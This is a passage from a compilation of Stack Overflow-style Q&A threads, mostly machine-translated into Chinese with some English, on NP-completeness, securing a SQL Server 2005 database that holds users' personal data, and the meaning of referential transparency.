到目前为止，还没有人提出这样一种确定性多项式时间算法，但也没有人证明不存在这种算法（任何人都可以做到这一点，那就是一百万美元：这就是[P = NP 问题](http://en.wikipedia.org/wiki/P_%3D_NP_problem)）。这并不意味着您无法解决 NP-Complete（或 NP-Hard）问题的特定实例。这只是意味着您无法拥有可以可靠地处理问题的所有实例的东西，就像您可以可靠地对整数列表进行排序一样。您很可能会想出一个算法，该算法在 NP-Hard 问题的所有实际实例中都能很好地工作。

* * *

## 回答 #4

> 赞同：33
> 
>             
> 
> 时间：2013-07-19T04:03:29.300

基本上这个世界的问题可以归类为

         1) 无法解决的问题 2) 棘手的问题 3) NP 问题 4) P 问题

* * *

         1）第一个是没有解决问题的方法。2）第二个是需要指数时间（也就是上面的O(2^n)）。3）第三个称为NP。4）第四是容易的问题。

* * *

P：指多项式时间问题的一种解法。

NP：指多项式时间尚未找到解决方案。我们不确定是否存在多项式时间解决方案，但是一旦您提供了解决方案，该解决方案就可以在多项式时间中得到验证。

NP Complete：指在多项式时间内我们还没有找到解决方案，但可以在多项式时间内进行验证。NP 中的问题 NPC 是更难的问题，所以如果我们能证明我们对 NPC 问题有 P 解，那么可以在 P 解中找到 NP 问题。

NP Hard：指多项式时间还没有找到解决方案，但肯定无法在多项式时间中得到验证。NP Hard 问题超过 NPC 难度。

* * *

## 回答 #5

> 赞同：32
> 
>             
> 
> 时间：2008-10-17T01:58:31.143

NP-Complete 是一类问题。

该类**`P`**由可在**多项式时间**内解决的问题组成。例如，对于某个常数 k ，它们可以在 O(n ^(k ) 中求解，其中)*n*是输入的大小。简而言之，您可以编写一个在*合理*时间内运行的程序。

该类**`NP`**由在多项式时间内**可验证的问题组成。**也就是说，如果我们得到一个潜在的解决方案，那么我们可以检查给定的解决方案在多项式时间内是否正确。

一些例子是布尔可满足性（或**SAT**）问题，或哈密顿循环问题。已知有许多问题属于 NP 类。

**`NP-Complete`**意味着该问题**至少**与 NP 中的任何问题一样难。

它对计算机科学很重要，因为已经证明 NP 中的任何问题都可以**转化**为 NP-complete 中的另一个问题。这意味着任何一个 NP 完全问题的解决方案都是所有 NP 问题的解决方案。

许多安全算法依赖于这样一个事实，即 NP 难题不存在已知的解决方案。如果找到解决方案，肯定会对计算产生重大影响。

* * *

## 回答 #6

> 赞同：22
> 
>             
> 
> 时间：2008-10-17T01:31:05.923

这是一类问题，我们必须模拟每一种可能性，以确保我们有最佳解决方案。

对于一些 NP-Complete 问题，有很多很好的启发式方法，但它们充其量只是一个有根据的猜测。

* * *

## 回答 #7

> 赞同：19
> 
>             
> 
> 时间：2008-10-17T02:32:55.380

如果您正在寻找 NP 完全问题的示例，那么我建议您查看[3-SAT](http://en.wikipedia.org/wiki/Boolean_satisfiability_problem)。

基本前提是你有一个合[取范式](http://en.wikipedia.org/wiki/Conjunctive_normal_form)的表达式，这是一种说法，你有一系列由 OR 连接的表达式，它们都必须为真：

```
(a or b) and (b or !c) and (d or !e or f) ... 
```

3-SAT 问题是找到一个解决方案，该解决方案将满足每个 OR 表达式恰好有 3 个要匹配的布尔值的表达式：

```
(a or !b or !c) and (!a or b or !d) and (b or !c or d) ... 
```

这个问题的解决方案可能是（a=T，b=T，c=F，d=F）。然而，在多项式时间的一般情况下，还没有发现可以解决这个问题的算法。这意味着解决此问题的最佳方法本质上是进行暴力猜测和检查，并尝试不同的组合，直到找到可行的组合。

3-SAT 问题的特别之处在于，任何 NP 完全问题都可以简化为 3-SAT 问题。这意味着，如果你能找到一个多项式时间算法来解决这个问题，那么你将获得[1,000,000 美元](http://en.wikipedia.org/wiki/Millennium_Prize_Problems)，更不用说全世界计算机科学家和数学家的尊重和钦佩了。

* * *

## 回答 #8

> 赞同：14
> 
>             
> 
> 时间：2008-10-17T01:27:30.660

老实说，[维基百科](http://en.wikipedia.org/wiki/NP-complete)可能是寻找答案的最佳场所。

如果 NP = P，那么我们可以比我们以前想象的更快地解决非常困难的问题。如果我们在 P（多项式）时间内只解决一个 NP-Complete 问题，那么它可以应用于 NP-Complete 类别中的所有其他问题。

* * *

## 回答 #9

> 赞同：11
> 
>             
> 
> 时间：2008-11-20T09:35:39.813

我们需要将算法和问题分开。我们编写算法来解决问题，它们以某种方式扩展。虽然这是一种简化，但如果缩放足够好，让我们用“P”标记算法，如果不是，则用“NP”标记。

了解我们试图解决的问题，而不是我们用来解决这些问题的算法，这很有帮助。所以我们会说所有具有良好缩放算法的问题都在“P”中。而那些具有较差缩放算法的算法是“在NP中”。

这意味着许多简单的问题也“在 NP 中”，因为我们可以编写糟糕的算法来解决简单的问题。知道 NP 中的哪些问题是真正棘手的问题会很好，但我们不只是想说“这是我们还没有找到好的算法的问题”。毕竟，我可以想出一个我认为需要超级惊人算法的问题（称之为 X）。我告诉全世界我能想出的最好的算法来解决 X 的扩展性很差，所以我认为 X 是一个非常棘手的问题。但是明天，也许比我更聪明的人发明了一种算法来解决 X 并且在 P 中。所以这不是对困难问题的一个很好的定义。

尽管如此，NP 中有很多问题没有人知道一个好的算法。因此，如果我可以*证明*X 是某种问题：*也*可以使用一种好的算法来解决 X，以某种迂回的方式，为NP中的*所有*其他问题提供一个好的算法。那么现在人们可能会更加确信 X 是一个真正棘手的问题。在这种情况下，我们称 X NP-Complete。

* * *

## 回答 #10

> 赞同：8
> 
>             
> 
> 时间：2011-12-30T08:14:41.577

我听过一个解释，那就是：“NP-Completeness 可能是算法研究中比较神秘的思想之一。”NP 代表“非确定性多项式时间”，是所谓的复杂性类的名称可以属于哪些问题。关于**NP**复杂性类的重要一点是，可以**验证该类中的问题**通过多项式时间算法。例如，考虑计算东西的问题。假设桌子上有一堆苹果。问题是“有多少个苹果？” 你会得到一个可能的答案，8。你可以在多项式时间内验证这个答案，方法是使用计算苹果的算法。计算苹果的时间为 O(n)（即 Big-oh 表示法），因为计算每个苹果需要一步。对于 n 个苹果，您需要 n 个步骤。这个问题属于 NP 复杂度类。

如果一个问题可以被证明是**NP-Hard**且在多项式时间内**可验证**，则该问题被归类为**NP-complete 。**无需深入讨论 NP-Hard，只需说某些问题尚未找到多项式时间解决方案即可。也就是说，它需要像 n! (n 阶乘) 步骤来解决它们。但是，如果您获得了 NP-Complete 问题的解决方案，您可以在多项式时间内对其进行验证。

 ****NP 完全问题的一个典型例子是旅行商问题。”

作者：ApoxyButt 来自：[http ://www.everything2.com/title/NP-complete](http://www.everything2.com/title/NP-complete)

* * *

## 回答 #11

> 赞同：6
> 
>             
> 
> 时间：2008-10-23T04:30:40.753

上面对 NP 完全问题的定义是正确的，但我想我可能会对它们的哲学重要性大谈特谈，因为还没有人解决这个问题。

您遇到的几乎所有复杂问题都是 NP Complete。这个类有一些非常基本的东西，而且它似乎在计算上与容易解决的问题不同。它们有自己的味道，识别它们并不难。这基本上意味着您不可能准确解决任何中等复杂的算法——调度、优化、打包、覆盖等。

但是，如果您遇到的问题是 NP Complete，则并非所有问题都会丢失。人们在一个广阔且技术含量很高的领域研究近似算法，这将为您保证接近 NP 完全问题的解决方案。其中一些是非常强大的保证——例如，对于 3sat，您可以通过一个非常明显的算法获得 7/8 保证。更好的是，实际上，有一些非常强大的启发式算法，它们擅长为这些问题提供很好的答案（但不能保证！）。

请注意，两个非常著名的问题——图同构和因式分解——不知道是 P 还是 NP。

* * *

## 回答 #12

> 赞同：4
> 
>             
> 
> 时间：2019-08-23T17:12:10.793

据我所理解

P 是可以用确定性 TM 在多项式时间内解决的问题集。

NP 是一组需要在多项式时间内解决非确定性 TM 的问题。这意味着我们可以并行检查所有不同的变量组合，每个实例都需要多项式时间。如果问题是可解决的，那么至少有一个并行的 TM 实例会以“是”停止。这也意味着，如果您可以对变量/解决方案做出正确的猜测，那么您只需要检查它在多项式时间内的有效性。

NP-Hard 是问题比 NP 更难的集合。这意味着 NP-Hard 问题比 NP 集中的任何问题都更难。即使使用图灵机的非确定性，这些问题也是指数级的。因此，并行计算在解决这些问题时无济于事。

NP-Complete 是 NP 和 NP-Hard 的交集。据我了解，

1.  NP-Complete 中的问题至少与 NP 集中最难的问题一样难。

2.  所有 NP-Complete 问题的类别是等价的，即 NP-Complete 集中的一个问题可以简化为任何其他 NP-Complete 问题。这意味着如果任何 NP-Complete 问题都有一个有效的解决方案，那么所有 NP-Complete 问题都可以用相同的解决方案来解决。

如果 NP-Complete 集中的任何问题在多项式时间内是确定性可解的，那么整个 NP-Complete 集在多项式时间内是确定性可解的。此外，由于 NP-Complete 问题至少与 NP-Complete 中最难的问题一样难，因此 NP-Complete 中的所有问题（与 NP-Complete 中的问题相同或更容易）都将受到确定性多项式运行时间的限制，将 P 集扩展到 NP 集上，得到 P=NP。

如果我犯了任何错误，请告诉我。

* * *

## 回答 #13

> 赞同：3
> 
>             
> 
> 时间：2017-11-12T14:16:34.557

## NP问题：-

1.  NP问题是可以在非确定性多项式时间内解决的问题。

2.  非确定性算法分两个阶段运行。

3.  非确定性猜测阶段 && 非确定性验证阶段。

### Np 问题的类型

1.  NP完成

2.  NP硬

**NP完全问题：-**

1 决策问题 A 如果具有以下两个属性，则称为 NP 完全：-

1.  它属于NP类。

2.  NP 中的所有其他问题都可以在多项式时间内转换为 P。

一些前：-

*   背包问题

*   子集和问题

*   顶点覆盖问题

* * *

## 回答 #14

> 赞同：1
> 
>             
> 
> 时间：2014-10-28T17:28:00.537

NP完全问题是一组问题，任何其他NP问题都可以在多项式时间内归约，并且其解决方案仍可以在多项式时间内得到验证。也就是说，任何 NP 问题都可以转化为任何 NP 完全问题。– 非正式地，NP 完全问题是至少与 NP 中的任何其他问题一样“难”的 NP 问题。

# sql-server - 如何保护 SQL Server 2005 数据库？

> ID：210832
> 
>         
> 
> 赞同：2
> 
>         
> 
> 时间：2008-10-17T01:26:37.760
> 
>         
> 
> 标签：sql-server, security

我有一个用于 Web 应用程序的数据库，其中包含有关我的用户的一些个人信息。

我应该怎么做才能确保数据安全？

当然，对数据进行加密是有道理的……但是从一开始就阻止某人进入机器呢？

对于需要访问数据、进行修复等的开发人员，我该怎么办？

是否有可以用作指南的文档或最佳实践网站？

* * *

## 回答 #1

> 赞同：4
> 
>             
> 
> 时间：2008-10-17T02:22:54.277

根据数据的类型，我不确定是否需要加密来为您提供对系统和数据库本身的安全访问。我们所有的生产数据库服务器都位于防火墙后面。只有管​​理网络上的系统才能通过防火墙进行访问，并且只能访问特定的必需端口。数据库服务器不托管 Web 服务器。

对数据库服务器本身的访问仅限于 DBA 和平台支持人员。他们使用管理登录，而不是他们的个人登录 ID。这样，如果他们的个人帐户遭到入侵，数据库服务器就不会受到威胁。

对于 Web 服务器，只有 Web 管理员和平台支持才能访问（我碰巧戴了两个帽子，Web 开发人员和 Web 管理员，尽管这在我们的组织中很少见）。  

开发人员可以访问他们可以发布其应用程序的共享，通常与网络管理员协调以进行任何设置/配置。一些高级开发人员被授予对数据库的管理员访问权限，以便创建/修改模式。

通常情况下，您使用本地安装的数据库服务器进行开发，将代码上传到访问策略稍宽松但只能从公司网络访问的 QA 服务器，然后让 DBA 将数据库模式和角色复制到生产环境并发布您的应用到生产 Web 服务器。  

Web apps are often configured to run under limited credential service accounts which have read/write, but not admin, access to the database.  I typically encrypt any part of my web.config that contains connection information as well.  

The general idea is to give enough access to get your job done without too much bother, but limit access to the minimum required.

Oh.  And no "real" data on development or QA servers.

[EDIT] We don't keep SSNs or credit card numbers.  If you do, you'll need to be even more careful.  Most of my apps do access logging, some are required to due to HIPPA, but I find that it is a good practice for just about anything meaningful

* * *

## 回答 #2

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T01:37:13.713

好吧，开发人员可能应该在一个不包含敏感信息的开发数据库上完成所有工作。

* * *

## 回答 #3

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T07:58:12.523

Here in the UK we have legislation known as the Data Protection Act. If you worked for a UK company I would advise you to speak to your company's 'data controller' (being the individual whom the Information Commissioner's Office can pursue legally in instances of non-compliance) and they will be able to furnish you with a definitive answer about what 'secure' means as regards the data in question, probably enshrined in a written company policy. 

If you are in the US I'd guess your corporation might have a bunch of highly paid lawyers who will be able to similarly give a definitive answer :)

I'm no legal expert but would suggest that obfuscating data does not make it fit for any purposes other than that for which it was obtained e.g. integration testing by developers using obfuscated 'real life' data is probably a no-no.

* * *

## 回答 #4

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T01:38:10.623

您需要为 Windows 服务器实践标准安全性。一个好的起点是使用集成登录而不是 SQL 登录。

您将需要在线学习这些书籍。您可以授予某些用户只读访问权限。其他人可能会被拒绝访问敏感表。

* * *

## 回答 #5

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T04:48:04.840

I would use Active Directory to control access to SQL Server or any network resource.  By grouping the users and applying security to the group, it will make it so much easier to make changes in the future.

Here is a guide from Microsoft on SQL Server 2005 Security Best Practices:
[http://download.microsoft.com/download/8/5/e/85eea4fa-b3bb-4426-97d0-7f7151b2011c/SQL2005SecBestPract.doc](http://download.microsoft.com/download/8/5/e/85eea4fa-b3bb-4426-97d0-7f7151b2011c/SQL2005SecBestPract.doc)
*Note: it downloads a Word document, so you will need MS Word or the MS Word viewer

This document has a lot of detail so you may want to grab some coffee first :).

However, I agree with the others, active development shouldn't happen against production data.  We currently use a process of cleaning production data before it gets to the QA or Dev environments.

Another option we explored is developing a solution to generate data for Dev and QA.

# functional-programming - 什么是参照透明度？

> ID：210835
> 
>         
> 
> 赞同：313
> 
>         
> 
> 时间：2008-10-17T01:27:53.357
> 
>         
> 
> 标签：functional-programming, computer-science, theory, referential-transparency

**参考透明度**一词是什么意思？我听说它被描述为“这意味着你可以用 equals 替换 equals”，但这似乎是一个不充分的解释。

* * *

## 回答 #1

> 赞同：396
> 
>             
> 
> 时间：2012-03-25T12:03:24.240

The term "referential transparency" comes from [analytical philosophy](https://en.wikipedia.org/wiki/Analytical_philosophy), the branch of philosophy that analyzes natural language constructs, statements and arguments based on the methods of logic and mathematics. In other words, it is the closest subject outside computer science to what we call [programming language semantics](https://en.wikipedia.org/wiki/Programming_language_semantics).  The philosopher [Willard Quine](https://en.wikipedia.org/wiki/Willard_Van_Orman_Quine) was responsible for initiating the concept of referential transparency, but it was also implicit in the approaches of Bertrand Russell and Alfred Whitehead.

At its core, "referential transparency" is a very simple and clear idea.  The term "referent" is used in analytical philosophy to talk about *the thing that an expression refers to*.  It is roughly the same as what we mean by "meaning" or "denotation" in programming language semantics.  Using Andrew Birkett's example ([blog post](http://www.nobugs.org/blog/archives/2008/11/12/why-do-they-call-it-referentially-transparent/)), the term "the capital of Scotland" refers to the city of Edinburgh.  That is a straightforward example of a "referent".

A context in a sentence is "referentially transparent" if replacing a term in that context by another term that *refers to the same entity* doesn't alter the meaning.  For example

> The Scottish Parliament meets in the capital of Scotland.

means the same as

> The Scottish Parliament meets in Edinburgh.

So the context "The Scottish Parliament meets in ..." is a referentially transparent context.  We can replace "the capital of Scotland" with "Edinburgh" without altering the meaning.  To put another way, the context only cares about what the term refers to and nothing else.  That is the sense in which the context is "referentially transparent."

On the other hand, in the sentence,

> Edinburgh has been the capital of Scotland since 1999.

we can't do such a replacement.  If we did, we would get "Edinburgh has been Edinburgh since 1999", which is a nutty thing to say, and doesn't convey the same meaning as the original sentence.  So, it would seem that the context "Edinburgh has been ... since 1999" is referentially opaque (the opposite of referentially transparent).  It apparently cares about *something more* than what the term refers to.  What is it?

Things such as "the capital of Scotland" are called *definite terms* and they gave no lean amount of head ache to logicians and philosophers for a long time.  Russell and Quine sorted them out saying that they are not actually "referential", i.e., it is a mistake to think that the above examples are used to refer to entities.  The right way to understand "Edinburgh has been the capital of Scotland since 1999" is to say

> Scotland has had a capital since 1999 and that capital is Edinburgh.

This sentence cannot be transformed to a nutty one.  Problem solved!  The point of Quine was to say that natural language is messy, or at least complicated, because it is made to be convenient for practical use, but philosophers and logicians should bring clarity by understanding them in the right way.  Referential transparency is a tool to be used for bringing such *clarity of meaning*.

What does all this have to do with programming?  Not very much, actually.  As we said, referential transparency is a tool to be used in understanding language, i.e., in assigning *meaning*.  [Christopher Strachey](https://en.wikipedia.org/wiki/Christopher_Strachey), who founded the field of programming language semantics, used it in his study of meaning.  His foundational paper "[Fundamental concepts in programming languages](https://github.com/papers-we-love/papers-we-love/blob/master/languages-theory/fundamental-concepts-in-programming-languages.pdf)" is available on the web.  It is a beautiful paper and everybody can read and understand it.  So, please do so.  You will be much enlightened.  He introduces the term "referential transparency" in this paragraph:

> One of the most useful properties of expressions is that called by Quine referential
>   transparency. In essence this means that if we wish to ﬁnd the value of an expression which
>   contains a sub-expression, the only thing we need to know about the sub-expression is its
>   value. Any other features of the sub-expression, such as its internal structure, the number
>   and nature of its components, the order in which they are evaluated or the colour of the ink
>   in which they are written, are irrelevant to the value of the main expression.

The use of "in essence" suggests that Strachey is paraphrasing it in order to explain it in simple terms.  Functional programmers seem to understand this paragraph in their own way.  There are 9 other occurrences of "referential transparency" in the paper, but they don't seem to bother about any of the others.  In fact, the whole paper of Strachey is devoted to explaining the meaning of *imperative programming languages*.  But, today, functional programmers claim that imperative programming languages are *not* referentially transparent.  Strachey would be turning in his grave.

We can salvage the situation.  We said that natural language is "messy, or at least complicated" because it is made to be convenient for practical use.  Programming languages are the same way.  They are "messy, or at least complicated" because they are made to be convenient for practical use.  That does not mean that they need to confuse us.  They just have to be understood the right way, using a meta language that is referentially transparent so that we have clarity of meaning.  In the paper I cited, Strachey does exactly that.  He explains the meaning of imperative programming languages by breaking them down into elementary concepts, never losing clarity anywhere.  An important part of his analysis is to point out that expressions in programming languages have two kinds of "values", called *l-values* and *r-values*.  Before Strachey's paper, this was not understood and confusion reigned supreme.  Today, the definition of C mentions it routinely and every C programmer understands the distinction.  (Whether the programmers in other languages understand it equally well is hard to say.)

Both Quine and Strachey were concerned with the meaning of language constructions that involve some form of context-dependence.  For example, our example "Edinburgh has been the capital of Scotland since 1999" signifies the fact that "capital of Scotland" depends on the time at which it is being considered.  Such context-dependence is a reality, both in natural languages and programming languages.  Even in functional programming, free and bound variables are to be interpreted with respect to the context in which they appear in.  Context dependence of any kind blocks referential transparency in some way or the other.  If you try to understand the meaning of terms without regard to the contexts they depend on, you would again end up with confusion.  Quine was concerned with the meaning of modal logic.  He held that [modal logic](https://plato.stanford.edu/entries/logic-modal/) was referentially opaque and it should be cleaned up by translating it into a referentially transparent framework (e.g., by regarding necessity as provability).  He largely lost this debate.  Logicians and philosophers alike found Kripke's possible world semantics to be perfectly adequate.  Similar situation also reigns with imperative programming.  State-dependence explained by Strachey and store-dependence explained by Reynolds (in a manner similar to Kripke's possible world semantics) are perfectly adequate.  Functional programmers don't know much of this research.  Their ideas on referential transparency are to be taken with a large grain of salt.

[Additional note: The examples above illustrate that a simple phrase such as "capital of Scotland" has multiple levels of meaning.  At one level, we might be talking about the capital at the current time.  At another level, we might talking about all possible capitals that Scotland might have had through the course of time.  We can "zoom into" a particular context and "zoom out" to span all contexts quite easily in normal practice.  The efficiency of natural language makes use of our ability to do so.  Imperative programming languages are efficient in very much the same way.  We can use a variable *x* on the right hand side of an assignment (the *r-value*) to talk about its value in a particular state.  Or, we might talk about its *l-value* which spans all states.  People are rarely confused by such things.  However, they may or may not be able to precisely explain all the layers of meaning inherent in language constructs.  All such layers of meaning are not necessarily 'obvious' and it is a matter of science to study them properly.  However, the inarticulacy of ordinary people to explain such layered meanings doesn't imply that they are confused about them.]

*A separate "postscript" below relates this discussion to the concerns of functional and imperative programming*.

* * *

## 回答 #2

> 赞同：144
> 
>             
> 
> 时间：2008-10-17T01:39:57.670

引用透明性是函数式编程中常用的一个术语，意味着给定一个函数和一个输入值，您将始终收到相同的输出。也就是说函数中没有使用外部状态。

下面是一个引用透明函数的例子：

```
int plusOne(int x)
{
  return x+1;
} 
```

对于引用透明函数，给定一个输入和一个函数，您可以用一个值替换它而不是调用该函数。因此，我们可以将其替换为 6，而不是使用参数 5 调用 plusOne。

另一个很好的例子是一般的数学。在数学中，给定一个函数和一个输入值，它总是映射到相同的输出值。f(x) = x + 1。因此数学中的函数是参照透明的。

This concept is important to researchers because it means that when you have a referentially transparent function, it lends itself to easy automatic parallelization and caching. 

Referential transparency is used always in functional languages like Haskell.

--

In contrast there is the concept of referential opaqueness.  This means the opposite.  Calling the function may not always produce the same output. 

```
//global G
int G = 10;

int plusG(int x)
{//G can be modified externally returning different values.
  return x + G;
} 
```

Another example, is a member function in an object oriented programming language.  Member functions commonly operate on its member variables and therefore would be referential opaque.  Member functions though can of course be referentially transparent.

Yet another example is a function that reads from a text file and prints the output.  This external text file could change at any time so the function would be referentially opaque. 

* * *

## 回答 #3

> 赞同：96
> 
>             
> 
> 时间：2008-10-17T02:22:07.070

A referentially transparent function is one which only depends on its input.

* * *

## 回答 #4

> 赞同：83
> 
>             
> 
> 时间：2012-07-31T12:35:05.777

[This is a postscript to my answer from March 25, in an effort to bring the discussion closer to the concerns of functional/imperative programming.]

The functional programmers' idea of referential transparency seems to differ from the standard notion in three ways:

*   Whereas the philosophers/logicians use terms like "reference", "denotation", "designatum" and "*bedeutung*" (Frege's German term), functional programmers use the term "value".  (This is not entirely their doing.  I notice that Landin, Strachey and their descendants also used the term "value" to talk about reference/denotation.  It may be just a terminological simplification that Landin and Strachey introduced, but it seems to make a big difference when used in a naive way.)

*   Functional programmers seem to believe that these "values" exist within the programming language, not outside.  In doing this, they differ from both the philosophers and the programming language semanticists.

*   They seem to believe that these "values" are supposed to be obtained by evaluation.

For example, the Wikipedia article on [referential transparency](http://en.wikipedia.org/wiki/Referential_transparency_%28computer_science%29) says, this morning:

> An expression is said to be referentially transparent if it can be replaced with its value without changing the behavior of a program (in other words, yielding a program that has the same effects and output on the same input).

This is completely at variance with what the philosophers/logicians say.  They say that a context is referential or referentially transparent if an expression in that context can be replaced by another *expression* that refers to the same thing (a *coreferential* expression).  Who are these philosophers/logicians?  They include [Frege](http://en.wikipedia.org/wiki/Frege), [Russell](http://en.wikipedia.org/wiki/Bertrand_russell), [Whitehead](http://en.wikipedia.org/wiki/Alfred_Whitehead), [Carnap](http://en.wikipedia.org/wiki/Carnap), [Quine](http://en.wikipedia.org/wiki/Willard_Van_Orman_Quine), [Church](http://en.wikipedia.org/wiki/Alonzo_Church) and countless others.  Each one of them is a towering figure.  The combined intellectual power of these logicians is earth-shattering to say the least.  All of them are unanimous in the position that referents/denotations exist outside the formal language and expressions within the language can only talk *about* them.  So, all that one can do within the language is to replace one expression by another expression that refers to the same entity.  The referents/denotations themselves *do not* exist within the language.  Why do the functional programmers deviate from this well-established tradition?

One might presume that the programming language semanticists might have misled them.  But, they didn't.

[Landin](http://www.thecorememory.com/Next_700.pdf):

> (a) each expression has a
>   nesting subexpression structure, (b) each subexpression
>   *denotes something (usually a number, truth value or
>   numerical function)*, (c) the thing an expression denotes,
>   i.e., its "value", depends only on the values of its sub-
>   expressions, not on other properties of them. [Added emphasis]

[Stoy](http://books.google.co.uk/books?id=jM0mAAAAMAAJ&source=gbs_slider_cls_metadata_0_mylibrary):

> The only thing that matters about an expression is its value, and any subexpression can be
>   replaced by *any other equal in value* [Added emphasis]. Moreover, the value of an expression is, within certain limits, the same whenever it occurs".

[Bird and Wadler](http://books.google.co.uk/books?id=Op5QAAAAMAAJ&source=gbs_slider_cls_metadata_0_mylibrary):

> the value of an expression depends only on the the values of its constituent
>   expressions (if any) and these subexpressions may be replaced freely by *others
>   possessing the same value* [Added emphasis].

So, in retrospect, the efforts of Landin and Strachey to simplify the terminology by replacing "reference"/"denotation" with "value" might have been injudicious.  As soon as one hears of a "value", there is a temptation to think of an evaluation process that leads to it.  It is equally tempting to think of whatever the evaluation produces as the "value", even though it might be quite clear that that is not the denotation.  That is what I gather to have happened to the concept of "referential transparency" in the eyes of functional programmers.  But the "value" that was being spoken of by the early semanticists is *not* the result of an evaluation or the output of a function or any such thing.  It is the denotation of the term.

Once we understand the so-called "value" of an expression ("reference" or "denotation" in classical philosophers' discourse) as a complex mathematical/conceptual object, all kinds of possibilities open up.  

*   Strachey interpreted variables in imperative programming languages as *L-values*, as mentioned in my March 25 answer, which is a sophisticated conceptual object that does not have a direct representation within the syntax of a programming language.  

*   He also interpreted commands in such languages as state-to-state functions, another instance of a complex mathematical object that is not a "value" within the syntax.  

*   Even a side-effecting function call in C has a well-defined "value" as a state transformer that maps states to pairs of states and values (the so-called "monad" in functional programmers' terminology).  

The reluctance of functional programmers to call such languages "referentially transparent" merely implies that they are reluctant to admit such complex mathematical/conceptual objects as "values".  On the other hand, they seem perfectly willing to call a state transformer a "value" when it is put in their own favourite syntax and dressed up with a buzz word like "monad".  I have to say that they are being entirely inconsistent, even if we grant it to them that their idea of "referential transparency" has some coherence.

A bit of history might throw some light on how these confusions came into being.  The period between 1962 to 1967 was a very intensive one for Christopher Strachey.  Between 1962-65, he took a part-time job as a research assistant with Maurice Wilkes to design and implement the programming language that came to be known as CPL.  This was an imperative programming language but was meant to have powerful functional programming language capabilities as well.  Landin, who was an employee of Strachey in his consultancy company, had a huge influence on Strachey's view of programming languages.  In the landmark 1965 paper "[Next 700 programming languages](http://www.thecorememory.com/Next_700.pdf)", Landin unabashedly promotes functional programming languages (calling them *denotative* languages) and describes imperative programming languages as their "antithesis".  In the ensuing discussion, we find Strachey raising doubts on Landin's strong position.  

> ... DLs form
>   a subset of all languages. They are an interesting subset, but one
>   which is inconvenient to use unless you are used to it. We need
>   them because *at the moment* we don't know how to construct
>   proofs with languages which include imperatives and jumps. [Added emphasis]

In 1965, Strachey took the position of a Reader at Oxford and seems to have worked essentially full-time on developing a theory of imperatives and jumps.  By 1967, he was ready with a theory, which he taught in his course on "[Fundamental concepts in programming languages](http://www.itu.dk/courses/BPRD/E2009/fundamental-1967.pdf)" in a Copenhagen summer school. The lecture notes were supposed to have been published but "unfortunately, because of dilatory
editing, the proceedings never materialized; like
much of Strachey’s work at Oxford, however, the
paper had an influential private circulation." ([Martin Campbell-Kelly](http://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber=4392962&tag=1))

The difficulty of obtaining Strachey's writings could have led to the confusions being propagated, with people relying on secondary sources and hearsay.  But, now that "[Fundamental concepts](http://www.itu.dk/courses/BPRD/E2009/fundamental-1967.pdf)" is readily available on the web, there is no need to resort to guess work.  We should read it and make up our own mind as to what Strachey meant.  In particular:

*   In section 3.2, he  deals with "expressions" where he talks about "R-value referential transparency".  

*   His section 3.3 deals with "commands" where he talks about "L-value referential transparency".  

*   In section 3.4.5, he talks about "functions and routines" and declares that "any departure of R-value referential transparency in a R-value context should
    either be eliminated by decomposing the expression into several commands and simpler
    expressions, or, if this turns out to be difficult, the subject of a comment."

Any talk of "referential transparency" without understanding the distinction between L-values, R-values and other complex objects that populate the imperative programmer's conceptual universe is fundamentally mistaken.

* * *

## 回答 #5

> 赞同：23
> 
>             
> 
> 时间：2008-10-17T01:39:24.677

如果一个表达式可以用它的值替换，而不改变算法，则表达式是引用透明的，产生一个在相同输入上具有相同效果和输出的算法。

* * *

## 回答 #6

> 赞同：18
> 
>             
> 
> 时间：2008-10-17T01:36:39.923

引用透明函数是一种类似于数学函数的函数。给定相同的输入，它总是会产生相同的输出。这意味着传入的状态没有被修改，并且函数没有自己的状态。

* * *

## 回答 #7

> 赞同：11
> 
>             
> 
> 时间：2012-07-27T00:40:25.333

For those in need of a concise explanation I will hazard one (but read the disclosure below).

Referential transparency in a programming language promotes equational reasoning -- the more referential transparency you have the easier it is to do equational reasoning. E.g. with a (pseudo) function definition,

f x = x + x,

the ease with which you can (safely) replace f(foo) with foo + foo in the scope of this definition, without having too many constraints on where you can perform this reduction, is a good indication of how much referential transparency your programming language has.

For example if foo were x++ in the C programming sense then you could not perform this reduction safely (which is to say, if you were to perform this reduction you would't end up with the same program that you started with).

In practical programming languages you won't see perfect referential transparency but functional programmers care about it more than most (cf Haskell, where it is a core objective).

(Full disclosure: I am a functional programmer so by the top answer you should take this explanation with a grain of salt.)

* * *

## 回答 #8

> 赞同：8
> 
>             
> 
> 时间：2010-02-25T14:03:03.680

If you're interested in the etymology (ie. why does this concept have this particular name), have a look at my [blog post](http://www.nobugs.org/blog/archives/2008/11/12/why-do-they-call-it-referentially-transparent/) on the topic.  The terminology comes from the philosopher/logician Quine.

* * *

## 回答 #9

> 赞同：6
> 
>             
> 
> 时间：2012-08-02T05:43:53.387

1.  Denotational-semantics is based on modelling languages by building domains that constitute denotable *values*.

2.  Functional Programmers use the term *value* to describe the convergence of a computation based on the rewrite rules of the language ie. its operational semantics.

In 1 there is a clarity of two languages in question:  

*   the one being modelled, the object language

*   the language of modelling, the meta language  

In 2, thanks to the closeness of the object and metalanguages, they can be confused.

As a language implementer, I find that I need to constantly remember this distinction.  

So Prof. Reddy may I paraphrase you thus :-)

> In the contexts of functional programming and semantics, the term *Referential
>   Transparency* is not referentially transparent.

* * *

## 回答 #10

> 赞同：4
> 
>             
> 
> 时间：2016-02-29T17:45:32.733

The following answer I hope adds to and qualifies the controversial 1st and 3rd
answers.

Let us grant that an expression denotes or refers to
some referent. However, a question is whether these referents can be encoded isomorphically as part of expressions themselves, calling such expressions 'values'. For example, literal number values are a subset of the set of arithmetic expressions, truth values are a subset of the set of boolean expressions, etc. The idea is to evaluate an expression to its value (if it has one). So the word 'value' may refer to a denotation or to a distinguished element of the set of expressions. But if there is an isomorphism (a bijection) between the referent and the value we
can say they are the same thing.  (This said, one must be careful to define
the referents and the isomorphism, as proven by the field of denotational
semantics. To put an example mentioned by replies to the 3rd answer, the
algebraic data type definition `data Nat = Zero | Suc Nat` does not
correspond as expected to the set of natural numbers.)

Let us write `E[·]` for an expression with a hole, also known in some quarters
as a 'context'. Two context examples for C-like expressions are `[·]+1` and
`[·]++`.

Let us write `[[·]]` for the function that takes an expression (with no hole)
and delivers its meaning (referent, denotation, etc.) in some
